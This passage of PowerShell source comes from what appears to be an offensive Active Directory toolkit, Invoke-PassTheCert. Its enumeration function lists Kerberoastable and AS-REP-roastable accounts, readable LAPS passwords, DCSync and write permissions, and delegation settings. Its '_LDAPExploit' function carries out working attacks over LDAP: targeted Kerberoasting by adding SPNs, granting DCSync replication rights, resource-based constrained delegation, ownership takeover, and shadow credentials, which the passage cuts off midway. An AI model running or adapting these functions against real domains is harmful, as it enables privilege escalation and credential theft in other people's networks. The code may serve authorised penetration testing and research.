            Returns all accounts with the `PASSWD_NOTREQD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'admins'

            Returns all accounts with the `(admins=1)` attribute in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'LogonScripts'

            Returns all accounts with a LogonScripts attribute in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'CAs'

            Returns all Certificate Authorities in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'CertificateTemplates'

            Returns all Certificate Templates in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DAs'

            Returns all members (recursively) of the group `Domain Admins` in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'gMSAs'

            Returns all the Group Managed Service Accounts in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'sMSAs'

            Returns all the Standalone Managed Service Accounts in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'LAPS'

            Returns all readable LAPS Passwords in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'MAQ'

            Returns the Machine Account Quota attribute in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'RootDSE'

            Returns the `RootDSE` in the LDAP/S Server's Domain (default SearchBase) (in particular: DC Functionality, Forest Functionality, Domain Functionality, Server Name, Schema Naming Context, Configuration Naming Context, dNSHostName, Default Naming Context)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'OSs'

            Returns all Operating Systems of all computers (for which the `operatingSystem`, or `operatingSytemVersion`, attribute is set) in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Trusts'

            Returns all Trust Relationships in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ShadowCreds'

            Returns all objects with an msDS-KeyCredentialLink attribute in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Unconstrained'

            Returns all computers allowed for Unconstrained Delegation (i.e. allowed to act on behalf of any domain user against any service) in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Constrained'

            Returns all computers allowed for Constrained Delegation (i.e. allowed to act on behalf of any domain user against any altservice) in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'WritePrincipal'

            Returns any Write'ty ACE provided to any non-default user over any object in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DCSync'

            Returns any DCSync ACE provided to any non-default user over any domain object in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'PassPol'

            Returns any Password-Policy-related attribute of any object of class `domain` in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'All'

            Return'Em All !!!!!!!!

            - Enumerations requiring specific value ARE NOT run. In other words, enumerations like `GroupMembers`, or `OUMembers`, requiring specific parameters, ARE NOT run.

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name 'KindaGroupy'

            Returns all members (recursively) of the group named `KindaGroupy` in the LDAP/S Server's Domain (default SearchBase).

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'OUMembers' -Name 'Unity'

            Returns all members (recursively) of the Organizational Unit named `Unity` in the LDAP/S Server's Domain (default SearchBase).

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Owner' -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'

            Returns the owner of the 'John JD. DOE' object in the LDAP/S Server's Domain (default SearchBase).

        .OUTPUTS

            [PSCustomObject[]]

            Enumerated LDAP objects

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=1, Mandatory=$true, HelpMessage="LDAP Enumeration to perform")]
        #[ValidateSet('Kerberoasting')]
        [System.String]$Enum,

        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Seach Base of the LDAP lookup")]
        [System.String]$SearchBase,
        
        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')")]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [PSDefaultValue(Help="'Subtree' (i.e. search recursively from the given Search Base)")]
        [System.String]$SearchScope = 'Subtree',
        
        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the name of the thing to enumerate")]
        [System.String]$Name,
        
        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the thing to enumerate")]
        [System.String]$ObjectDN
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    # Avoid displaying that message for enumeration that may run recursively (e.g. nested OUs or Groups membership)
    if (-not ($Enum -in @('GroupMembers', 'OUMembers'))) {
        Write-Host ""
        Write-Host "`t`t[*] ============================================================== [*]"
        Write-Host "`t`t`t`t`tEnumerating '$Enum'                                             "
        Write-Host "`t`t[*] ============================================================== [*]"
        Write-Host ""
    }

    # If $SearchBase isn't specified, defaults to the LDAP/S Server's Domain
    if (-not $SearchBase) { $SearchBase = $(_Helper-GetDomainDNFromDN -DN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) }

    $RootDSE = _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base

    switch ($Enum) {

        'Kerberoasting' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*/*)(!(sAMAccountName=krbtgt)))' |Select distinguishedName,sAMAccountName,serviceprincipalname,objectcategory
        }

        'ASREPRoasting' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrolnames,objectcategory
        }

        'Descriptions' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(description=*)' |Select-Object distinguishedName,description
        }

        'Users' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user))' |Select-Object distinguishedName,sAMAccountName,useraccountcontrolnames,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,objectcategory
        }

        'Computers' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |Select-Object distinguishedName,sAMAccountName,dnshostname,useraccountcontrolnames,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,operatingsystem,operatingsystemversion,objectcategory
        }

        'Groups' {
            # Some objects having NO SID attribute, we silently continue errors.
            $ErrorActionPreference = 'SilentlyContinue'; 

            #return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(objectCategory=CN=Group,$($RootDSE.schemanamingcontext))" |Select distinguishedname
            
            $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=group)' 
            $Result |?{

                # For some reasons, some SIDs have Definition: byte[] objectsid=System.Byte[]
                # Some other SIDs have Definition: string objectsid= *, where * is a character. For instance, 'CN=Users,CN=Builtin,DC=X' container has objectSid '!' (?!)
                # For some other reasons, we may only parse Bytes using '_GetAttributeOfObject'. Hence, we'll filter the objectSid defined as Bytes only.
                ($_ |Get-Member -Name 'objectSid' -MemberType Properties).Definition -like '*objectsid=System.Byte*' 

            }|%{
                # Trick to get the S-1... SID (instead of the default bytes). 
                $_ | Add-Member -Force -NotePropertyName 'objectSid' -NotePropertyValue (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedName -Attribute 'objectSid');
            }

            return $Result |Select distinguishedname,samaccountname,objectSid,objectcategory
        }

        'DCs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        }

        'OUs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=organizationalUnit)'  |Select distinguishedName,ou,description,objectcategory
        }

        'Sites' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=site)'
        }

        'GPOs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=groupPolicyContainer)' |Select distinguishedname,displayname,gpcfilesyspath,objectcategory
        }

        'GPLinks' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(gPLink=*)(name=*))' |Select distinguishedName,name,gPLink,objectGUID,objectcategory
        }

        'Printers' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=printQueue)'
        }

        'DONT_EXPIRE_PASSWORD' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'DONT_EXPIRE_PASSWORD' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
        }

        'PASSWD_NOTREQD' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'PASSWD_NOTREQD' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
        }

        'admins' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectClass=person)(admincount=1))' |Select distinguishedName,name,sAMAccountName,userAccountControlNames,objectcategory
        }

        'LogonScripts' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
        }

        'CAs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKIEnrollmentService)'
        }

        'CertificateTemplates' {
            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)'
        }

        'DAs' {
            return _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name 'Domain Admins' |fl
        }

        'gMSAs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
        }

        'sMSAs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)'
        }

        'LAPS' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))'
        }

        'MAQ' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -Properties ms-DS-MachineAccountQuota -LDAPFilter '(objectClass=domain)'
        }

        'RootDSE' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
        }

        'OSs' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |?{ $_.operatingSystem -ne $null -or $_.operatingSytemVersion -ne $null } |Select distinguishedName,sAMAccountName,operatingSystem,operatingSytemVersion
        }

        'Trusts' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=trustedDomain)'
        }

        'ShadowCreds' {

            $KeyCredentials = [PSCustomObject]@()

            foreach ($KeyCredentialString in (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n") {
                # https://learn.microsoft.com/en-us/windows/win32/adschema/s-object-dn-binary
                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/DNWithBinary.cs
                if ($KeyCredentialString -notmatch '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
                    # Format MUST be DN-Binary: 'B:<char count>:<binary value>:<object DN>'
                    continue
                }

                $reader = [System.IO.BinaryReader]::new(
                    [System.IO.MemoryStream]::new(
                        (_Helper-GetBinaryFromHexString -HexString $matches[2]), 
                        $false
                    )
                )

                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredentialEntryType.cs
                $KeyCredential = [PSCustomObject]@{
                    ObjectDN        = $matches[3]
                    Version         = $null
                    Identifier      = $null
                    RawKeyMaterial  = $null
                    Usage           = $null
                    LegacyUsage     = $null
                    Source          = $null
                    DeviceId        = $null
                    CustomKeyInfo   = $null
                    LastLogonTime   = $null
                    CreationTime    = $null
                }

                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L331-L401
                $KeyCredential.Version = [int]$reader.ReadUInt32()
                while ($reader.BaseStream.Position -lt $reader.BaseStream.Length) {
                    $length = $reader.ReadUInt16()
                    $entryType = [byte]$reader.ReadByte()
                    $value = $reader.ReadBytes($length)

                    if ($KeyCredential.Version -eq 0) {
                        $padding = (4 - ($length % 4)) % 4
                        #if ($padding -gt 0) { $reader.ReadBytes($padding) | Out-Null }
                        $reader.ReadBytes($padding) | Out-Null
                    }
                    
                    switch ($entryType) {
                        1 { $KeyCredential.Identifier = if ($KeyCredential.Version -ge 2) { [System.Convert]::ToBase64String($value) } else { -join ($value | ForEach-Object { $_.ToString("x2") }) }; break; }
                        2 { break; }
                        3 { $KeyCredential.RawKeyMaterial = $value; break; }
                        4 { 
                            if ($length -eq 1) { $KeyCredential.Usage = $value[0] } 
                            else { $KeyCredential.LegacyUsage = [System.Text.Encoding]::UTF8.GetString($value); break; } 
                        }
                        5 { $KeyCredential.Source = $value[0]; break; }
                        6 { $KeyCredential.DeviceId = [Guid]::New($value); break; }
                        7 { $KeyCredential.CustomKeyInfo = $value; break; }
                        8 { $KeyCredential.LastLogonTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
                        9 { $KeyCredential.CreationTime = [DateTime]::FromFileTime([BitConverter]::ToInt64($value,0)); break; }
                    }
                }

                $reader.Close()

                $KeyCredentials += $KeyCredential
            }
            return $KeyCredentials
        }

        'Unconstrained' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
        }

        'Constrained' {
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToDelegateTo=*)'
        }

        "WritePrincipal" {
            $ResultObjects = @()

            _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=person)' |%{ 
                $TargetObject = $_; 
                $ResultObjects += _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetObject.distinguishedName |?{
                    $SourceSID = $_.SecurityIdentifier
                    $_.AceQualifier -eq 'AccessAllowed' -and ($_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and $SourceSID -match 'S-1-5-21-(\d+-){3}\d{4,}') |
                    Add-Member -PassThru -Force -NotePropertyName 'Target' -NotePropertyValue $TargetObject.distinguishedname
                }
            }
            
            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase (_Helper-GetDomainDNFromDN -DN (_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}

        }

        'DCSync' {
            
            $ResultObjects = @()
            
            _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -Properties * -LDAPFilter '(objectCategory=domain)' |%{
                $TargetDomain = $_; 
                $ResultObjects += _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDomain.distinguishedName |?{
                    $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*Write*' -or $_.AccessMaskNames -ilike '*ExtendedRight*' -or $_.ObjectAceTypeName -ieq 'DS-Replication-Get-Changes(-All)?$') -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}' |
                    Add-Member -PassThru -Force -NotePropertyName 'Target' -NotePropertyValue $TargetDomain.distinguishedname
                }
            }
            
            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase (_Helper-GetDomainDNFromDN -DN (_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}

        }

        'PassPol' {
            Write-Host "[*] The Provided 'DefaultPassPol2022DC.txt' May Be Checked To Get The Default Password Policy In Windows Server 2022 DC."
            Write-Host ""

            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' |Select-Object distinguishedName,lockoutobservationwindow,lockoutDuration,lockoutThreshold,maxPwdAge,minPwdAge,minPwdLength,pwdHistoryLength,pwdProperties,msDS-PasswordReversibleEncryptionEnabled
        }

        'All' {
            # Executing only the enumeration modules with the strict minimum number of mandatory parameters. For instance, we won't run OUMembers, or GroupMembers, as they require a specific parameter.
            foreach ($Enum in @('Kerberoasting', 'ASREPRoasting', 'Descriptions', 'Users', 'Computers', 'Groups', 'DCs', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'admins', 'LogonScripts', 'CAs', 'CertificateTemplates', 'DAs', 'gMSAs', 'sMSAs', 'LAPS', 'MAQ', 'RootDSE', 'OSs', 'Trusts', 'ShadowCreds', 'Unconstrained', 'Constrained', 'DCSync', 'PassPol')) {
                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope |fl
            }
        }

        'GroupMembers' {

            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
            
            $Results = @() 
            
            # First degree membership
            $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(&(cn=$Name)(|(member=*)(objectClass=group)))"
            $Result = $Result |Select -ExpandProperty Member | %{ _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(distinguishedName=$_)" }
            $Results += $Result

            # Grabbing each value within the 'member' array attribute of the group. 
            # Each of these is a principal's distinguishedname, being either a `User`, `Computer`, `Group`, `OU`, or `Contact`.
            # The recursive logic relies on groups objects ONLY !
            $Result |?{ $_.objectcategory -eq "CN=Group,$($RootDSE.schemanamingcontext)"} |%{
                # True whenever a group is within a group, false otherwise (hence STOP of the recursive nested group lookup)
                $Results += _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name $_.cn
            }

            return $Results |Select distinguishedname,sAMAccountName,memberof,objectCategory
        }

        'OUMembers' {
            if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }
            # Not using the OU's DN as a base for search (e.g. 'OU=Unity,DC=X') allows to prevent the user to provide the OU's DN. Instead, the user may only specify 'Unity', Quicky'n'Handy.
            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,userAccountControlNames,objectcategory
        }

        'Owner' {
            if (-not (_Helper-IsEveryValueOfArrayDefined @($ObjectDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            return (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'nTSecurityDescriptor').Owner
        }

        Default { Write-Host "[!] LDAP Enumeration '$Enum' Not Recognized !"; return }
    }
}


function _LDAPExploit {
    
    <#

        .SYNOPSIS

            Invoke-PassTheCert wrapper for LDAP exploitation

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER Exploit 

            AD Exploitation to be performed (e.g. `Kerberoasting`).

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -TargetDN 'CN=SVC SU. USER,CN=Users,DC=X' -SPN 'cifs/FOO'

            Adds the provided `-SPN` (or, if not specified, random) to the specified account's `serviceprincipalname` attribute.

        .EXAMPLE

            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'DCSync' -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -TargetDN 'DC=X'

            Grants the principal `Wanha BE. ERUT` with DCSync privileges over the domain `X` (or, if not specified, the LDAP/S Server's domain)

        .EXAMPLE

            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'RBCD' -IdentityDN 'CN=Wanha WD. DELHEG,CN=Users,DC=X' -TargetDN 'CN=COMPUTATOR,CN=Computers,DC=X'

            Grants the principal `Wanha WD. DELHEG` Read/Write privileges against the `CN=COMPUTATOR,CN=Computers,DC=X`:`msDS-AllowedToActOnBehalfOfOtherIdentity` attribute

        .EXAMPLE

            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'ShadowCreds' -TargetDN 'CN=John JD. DOE,CN=Users,DC=X'

            Populates the targeted account `CN=John JD. DOE,CN=Users,DC=X`:`msDS-KeyCredentialLink` attribute with a new self-signed certificate.

            - This requires WRITE privileges against the target's `msDS-KeyCredentialLink` attribute.

        .EXAMPLE

            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-1-0' -TargetDN 'CN=Kinda KO. OWNED,CN=Users,DC=X'

            Sets the owner of `Kinda KO. OWNED` to the entity with SID `S-1-1-0`. In other words, `Everyone` becomes the owner of `Kinda KO. OWNED`.

            - This requires WRITE privileges against the target's `nTSecurityDescriptor` attribute

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=1, Mandatory=$true, HelpMessage="LDAP expoitation to perform")]
        [System.String]$Exploit,

        [Parameter(Position=2, Mandatory=$false)]
        [System.String]$SPN,

        [Parameter(Position=3, Mandatory=$false)]
        [System.String]$IdentityDN,

        [Parameter(Position=4, Mandatory=$false)]
        [System.String]$TargetDN,

        [Parameter(Position=5, Mandatory=$false)]
        [System.String]$OwnerSID
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    switch ($Exploit) {

        'Kerberoasting' {
            
            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            if (-not $SPN) { $SPN = "$(_Helper-GetRandomString -Length 4 -Charset 'abcdefghijklmnopqrstuvwxyz')/$(_Helper-GetRandomString -Length 8 -Charset 'abcdefghijklmnopqrstuvwxyz')" }
            
            Write-Verbose "[*$Exploit*] Trying To Add SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute..."
            
            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'serviceprincipalname' -Value $SPN

            Write-Host "[*$Exploit*] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"

        }

        "DCSync" {
            
            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            # Defaults to the LDAP/S Server's Domain
            if (-not $TargetDN) { $TargetDN = $(_Helper-GetDomainDNFromDN $(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)) }
            
            Write-Verbose "[*$Exploit*] Trying To Grant '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN $TargetDN)'..."

            # Grant the right if not already present
            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes' -TargetDN $TargetDN
            _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes-All' -TargetDN $TargetDN

            Write-Host "[*$Exploit*] Successfully Granted '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN -DN $TargetDN)' !!";

        }

        "RBCD" {
            
            if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            Write-Verbose "[*$Exploit*] Granting SDDL ACE Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity'..."

            _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN $IdentityDN -TargetDN $TargetDN -Attribute 'msDS-AllowedToActOnBehalfOfOtherIdentity' -SDDLACEType 'OA' -SDDLACERights 'RPWP'

            Write-Host "[*$Exploit*] Successfully Provided SDDL Rights 'ReadProperty, WriteProperty' To '$IdentityDN' Against '$TargetDN':'msDS-AllowedToActOnBehalfOfOtherIdentity' !!";

        }
        
        "ShadowCreds" {
            
            if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            try {

                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope Base |Select -ExpandProperty sAMAccountName

                # 1. Generate a self-signed certificate and export to file
                $NewSelfSignedCertificate = _Helper-GenerateSelfSignedCertificate -CN $sAMAccountName
                _Helper-ExportCertificateToFile -Certificate $NewSelfSignedCertificate -ExportPath "$sAMAccountName.pfx"
                
                # 2.a. Initalize Variables
                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L285
                $RawKeyMaterial         = _Helper-ExportRSAPublicKeyBCrypt -Certificate $NewSelfSignedCertificate
                #$RawKeyMaterial        = _Helper-ExportRSAPublicKeyDER -Certificate $NewSelfSignedCertificate

                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L295-L318
                $Version                = [uint32]0x00000200
